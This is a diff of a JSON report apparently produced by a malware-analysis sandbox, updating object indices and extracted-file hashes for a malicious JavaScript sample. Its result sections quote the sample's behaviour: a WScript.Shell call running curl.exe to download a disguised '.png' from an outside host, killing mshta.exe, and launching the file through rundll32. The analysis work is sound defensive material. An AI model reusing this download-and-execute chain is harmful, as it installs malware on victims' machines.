@@ -92,7 +92,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[18]()\n\n\t\tnew WScript.Shell[20]()\n",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[20]()\n\n\t\tnew WScript.Shell[22]()\n",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -115,7 +115,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tWScript.Shell[20].run(\"curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gi...\n\t\tWScript.Shell[20].run(\"taskkill /f /im mshta.exe\", 0)\n",
+        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tWScript.Shell[22].run(\"curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gi...\n\t\tWScript.Shell[22].run(\"taskkill /f /im mshta.exe\", 0)\n",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -138,7 +138,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tWScript.Shell[20].run(\"curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gi...\n\t\tWScript.Shell[20].run(\"taskkill /f /im mshta.exe\", 0)\n",
+        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tWScript.Shell[22].run(\"curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gi...\n\t\tWScript.Shell[22].run(\"taskkill /f /im mshta.exe\", 0)\n",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -161,7 +161,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell application\n\t\tShell.Application[21].shellexecute(\"rundll32\", \"C:\\ProgramData\\aj0iG.png,Wind\", \"\", \"open\", 3)\n",
+        "body": "JavaScript runs code via shell application\n\t\tShell.Application[23].shellexecute(\"rundll32\", \"C:\\ProgramData\\aj0iG.png,Wind\", \"\", \"open\", 3)\n",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -294,6 +294,14 @@
   "files": {
     "extracted": [
       {
+        "name": "vbscript_contents_1.vbs",
+        "sha256": "4189f5bf8d19056decfdcbeae5856cafed4db9dac53f1e90a66474bc5ad6723f"
+      },
+      {
+        "name": "vbscript_contents_3.vbs",
+        "sha256": "df4cd52df647bdca243a532dd3e2425b200db9ec71ba96872e93463a90e7d079"
+      },
+      {
         "name": "extracted_wscript.bat",
         "sha256": "fd2c12eb7e595d075dba3ca6ecf8116bee5191e97db673c85c3ac4152891b2c2"
       }
@@ -301,7 +309,7 @@
     "supplementary": [
       {
         "name": "temp_javascript.js",
-        "sha256": "5d0712bc654c1b30907ce14773cd6d0151cf01a688dff00b6548d18ee9355cb9"
+        "sha256": "53b51d074ab82daa64045dd46cfa78dea032c7ae7546b8b7f72f18ae0cc0778d"
       }
     ]
   },
